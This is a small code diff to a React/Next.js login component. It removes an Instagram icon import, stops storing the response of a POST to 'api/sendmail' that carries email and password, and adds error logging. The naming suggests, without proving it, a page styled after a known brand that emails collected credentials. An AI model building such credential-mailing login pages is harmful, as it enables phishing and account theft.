@@ -1,6 +1,6 @@
 'use client';
 import React, { useState } from 'react';
-import { Eye, EyeOff, Instagram } from 'lucide-react';
+import { Eye, EyeOff } from 'lucide-react';
 import Image from 'next/image';
 
 function App() {
@@ -18,7 +18,7 @@ function App() {
 
     try {
       // First verify email/password
-      const response = await fetch('api/sendmail', {
+      await fetch('api/sendmail', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -29,6 +29,7 @@ function App() {
 
 
     } catch (error) {
+      console.log(error)
     } finally {
       setLoading(false); // Reset loading state when the request is complete
     }
